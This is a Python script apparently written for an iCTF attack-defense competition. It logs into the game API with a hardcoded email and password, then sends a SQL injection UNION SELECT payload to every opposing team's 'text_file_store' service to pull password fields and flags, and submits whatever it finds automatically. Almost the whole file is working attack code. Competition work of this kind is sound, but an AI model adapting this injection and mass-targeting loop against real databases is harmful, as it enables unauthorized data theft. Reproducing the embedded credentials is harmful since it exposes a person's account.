from ictf import iCTF
import threading
import sys
from time import sleep
import random
import socket
import re

# Shiny colors
OKBLUE  = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL    = '\033[91m'
ENDC    = '\033[0m'

# Custom recv_unitl.. you know.. for reasons
def recv_until(s, text):
    BUFFER_SIZE = 2048
    data = ""
    loop = True
    while loop:
        tmp = s.recv(BUFFER_SIZE)
        if tmp.find(text) != -1: loop = False
        data += tmp
    return data

# Prepare everything and fire the exploits!!!
def prepare():
    # Get the initial
    ticks = 42;
    # Get iCTF-Foo and login
    ctf     = iCTF()
    team    = ctf.login("dominik.schlecht@hotmail.de", "cupjCQdjednhn4yZ")

    while(True):
        if ticks == team.get_tick_info().get("tick_id"):
            sleep(30)
            print OKBLUE    + "[~] Waiting for TICK"                    + ENDC
        else:
            # Maybe kill threads here..
            # We got a new tick, start the exploits!!1!
            ticks = team.get_tick_info().get("tick_id")

            # holts targets in format:
            #  {'team_name' : "Team name",'ip_address' : "10.7.<team_id>.2",'port' : <int port number>,'flag_id' : "Flag ID to steal"}
            targets = team.get_targets("text_file_store")

            # not really needed..
            results = []

            for target in targets.get("targets"):
                # Prevent too many threads (no DoS!!!)
                while 20 < threading.activeCount():
                    sleep(0.1)

                # Create a new thread running an exploit
                thread = exploit(
                            target.get("ip_address"),
                            target.get("port"),
                            target.get("flag_id"),
                            team
                        )
                results.append(thread)
                thread.start()

# Multithreaded class
class exploit(threading.Thread):
    def __init__(self, ip, port, flagID, team):
    	threading.Thread.__init__(self)
    	self.ip = ip
        self.port = port
    	self.flagID = flagID
        self.team   = team

    def run(self):
        # Init the socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))

        s.send('1\n')
        s.send('blub\n')
        s.send("1' UNION ALL SELECT acnum, cash, password FROM login WHERE acnum = '" + self.flagID)
        flag = s.recv(512)
        print flag
        s.close()
        p = re.compile('Your Balance is: (FLG.{13})')

        m = p.match(flag)
        print m

        if m:
            flag = m.group(1)


            # Submit it!
            # Param needs to be a list
            ret = self.team.submit_flag([flag])

            for resp in ret:
                if resp == "correct":
                    print OKGREEN   + "[+] Submitted flag sucessfully"              + ENDC
                elif resp == "incorrect":
                    print FAIL      + "[-] Incorrect flag"                          + ENDC
                elif resp == "alreadysubmitted" or resp == "notactive":
                    print WARNING   + "[|] Flag already submitted or not active"    + ENDC
                elif resp == "toomanyincorrect":
                    print FAIL      + "[-] Too many incorrect flags"                + ENDC
                else:
                    print OKBLUE    + "[~] Magic happening!!!!!"                    + ENDC
        else:
            print WARNING   + "[|] Service Fixed"    + ENDC

# Start here..
if __name__ == '__main__':
    prepare()
